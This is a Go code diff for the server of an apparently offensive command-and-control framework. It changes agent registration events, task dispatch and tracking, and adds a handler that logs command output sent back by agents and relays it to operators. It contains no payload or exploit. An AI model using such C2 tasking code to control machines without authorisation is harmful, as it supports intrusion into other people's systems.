@@ -3,6 +3,7 @@ package server
 import (
 	"bytes"
 	"fmt"
+	"log/slog"
 
 	bytehandler "github.com/execute-assembly/c2-proj/server/internal/bytes"
 	"github.com/execute-assembly/c2-proj/server/internal/database"
@@ -25,18 +26,14 @@ func NewClientRegisterHandler(Ip string, reader *bytes.Reader) ([]byte, error) {
 		return nil, err
 	}
 
-	rpc.BroadcastEvent("new_agent", CodeName, fmt.Sprintf("\n[*]New agent connected: %s", CodeName))
+	rpc.BroadcastEvent(1, CodeName, fmt.Sprintf("\n[*]New agent connected: %s", CodeName), 0)
 
 	return JwtBytes, nil
 }
 
-func GetTaskHandler(token string) ([]byte, error) {
-	AgentGuid, err := VerifyToken(token)
-	if err != nil {
-		return nil, err
-	}
+func GetTaskHandler(AgentGuid string) ([]byte, error) {
 
-	err = database.UpdateLastSeen_db(AgentGuid)
+	err := database.UpdateLastSeen_db(AgentGuid)
 	if err != nil {
 		return nil, err
 	}
@@ -62,9 +59,39 @@ func GetTaskHandler(token string) ([]byte, error) {
 		return nil, err
 	}
 
+	for _, t := range Tasks {
+		rpc.PendingMu.Lock()
+		rpc.PendingTasks[t.TaskID] = rpc.PendingTasksMap{
+			Guid:        AgentGuid,
+			CommandCode: t.CommandCode,
+			Param1:      t.Param1,
+			Param2:      t.Param2,
+		}
+		rpc.PendingMu.Unlock()
+	}
+
 	rpc.CommandMu.Lock()
 	rpc.CommandMap[AgentGuid] = rpc.CommandMap[AgentGuid][len(Tasks):]
 	rpc.CommandMu.Unlock()
 
 	return respBytes, nil
+}
+
+func HandlePostOutput(AgentGuid string, Data *bytes.Reader) error {
+
+	OutputList, err := bytehandler.ParseCommandOutput(Data)
+	if err != nil {
+		return err
+	}
+
+	rpc.PendingMu.Lock()
+	defer rpc.PendingMu.Unlock()
+	for _, t := range OutputList {
+		slog.Info("Agent Sent Command Output", "Agent_Guid", AgentGuid, "TaskID", t.TaskID)
+		rpc.BroadcastEvent(2, AgentGuid, t.Output, t.TaskID)
+		delete(rpc.PendingTasks, t.TaskID)
+	}
+
+	return nil
+
 }
